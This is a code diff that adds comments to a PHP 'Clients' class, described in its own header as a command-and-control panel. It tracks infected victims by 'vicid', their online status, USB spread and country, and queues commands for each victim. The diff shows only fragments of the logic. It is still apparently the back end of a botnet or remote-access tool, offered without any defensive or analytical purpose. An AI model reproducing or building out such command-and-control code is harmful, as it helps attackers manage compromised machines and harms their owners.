@@ -1,6 +1,11 @@
 <?php 
-
+/*
+Class to handle clients and C&c Panel
+using HTTP and MySQL
+*/
 class Clients extends Database{
+	
+	// Create a new client
 	public function newClient(array $clientdata){
 		try {
 			if ($this->isExist($clientdata['vicid'],"clients")) {
@@ -11,6 +16,7 @@ class Clients extends Database{
 			$stmt = $pdo->prepare($sql);
 
 			$stmt->execute($clientdata);
+			// create a new command 
 			$this->createCommand($clientdata['vicid']);
 			return 'Client Created';
 		  }
@@ -19,6 +25,7 @@ class Clients extends Database{
 		}
 	}
 
+	// Remove a client from the database
 	public function removeClient($clientID){
 		try {
 			$this->removeCommands($clientID);
@@ -32,6 +39,7 @@ class Clients extends Database{
 		}
 	}
 
+	// update a client
 	public function updateClient(array $clientdata){
 		try {
 			$pdo = $this->Connect();
@@ -54,6 +62,7 @@ class Clients extends Database{
 		}
 	}
 
+	// check if a client exist
 	public function isExist($clientID,$table_name){
 		try {
 			$pdo = $this->Connect();
@@ -70,6 +79,7 @@ class Clients extends Database{
 
 	}
 
+	// get all clients from database
 	public function getClients(){
 		try {
 			$pdo = $this->Connect();
@@ -83,7 +93,7 @@ class Clients extends Database{
 		}
 	}
 
-
+	// Count all clients
 	public function countClients(){
 		try {
 			$pdo = $this->Connect();
@@ -97,7 +107,7 @@ class Clients extends Database{
 		}
 	}
 
-
+	// get 1 client from the database using vicid
 	public function getClient($vicID){
 		try {
 			$pdo = $this->Connect();
@@ -111,7 +121,7 @@ class Clients extends Database{
 		}
 	}
 
-
+	// count online clients
 	public function countOnlineClients(){
 		try {
 			$pdo = $this->Connect();
@@ -125,6 +135,7 @@ class Clients extends Database{
 		}
 	}
 
+	// count offline clients
 	public function countOfflineClients(){
 		try {
 			$pdo = $this->Connect();
@@ -138,6 +149,7 @@ class Clients extends Database{
 		}
 	}
 
+	// count is_usb = yes clients
 	public function countClientByUSB()
 	{
 		try {
@@ -152,6 +164,7 @@ class Clients extends Database{
 		}
 	}
 
+	// update a client status online/offline
 	public function updateStatus($vicID,$status){
 		try {
 			$pdo = $this->Connect();
@@ -164,6 +177,7 @@ class Clients extends Database{
 		}
 	}
 
+	// get the last command using vicid
 	public function getCommand($vicID){
 		try {
 			$pdo = $this->Connect();
@@ -177,6 +191,7 @@ class Clients extends Database{
 		}
 	}
 
+	// update all clients statis offline/online
 	public function updateAllStatus($status){
 		try {
 			$pdo = $this->Connect();
@@ -189,6 +204,7 @@ class Clients extends Database{
 		}
 	}
 
+	// create a new command using vicid
 	public function createCommand($vicID){
 		try {
 			if ($this->isExist($vicID,"commands")) {
@@ -204,6 +220,7 @@ class Clients extends Database{
 		}
 	}
 
+	// update a command if a client exist
 	public function updateCommands($vicID,$command){
 		try {
 			$pdo = $this->Connect();
@@ -215,6 +232,7 @@ class Clients extends Database{
 		}
 	}
 
+	// remove command after uninstalling a client
 	public function removeCommands($vicID){
 		try {
 			$pdo = $this->Connect();
@@ -227,7 +245,7 @@ class Clients extends Database{
 		}
 	}
 
-
+	// count client by country for the map
 	public function countClientByCountry($code){
 		$pdo = $this->Connect();
 		$sql = "SELECT COUNT(*) FROM clients WHERE country = ?";
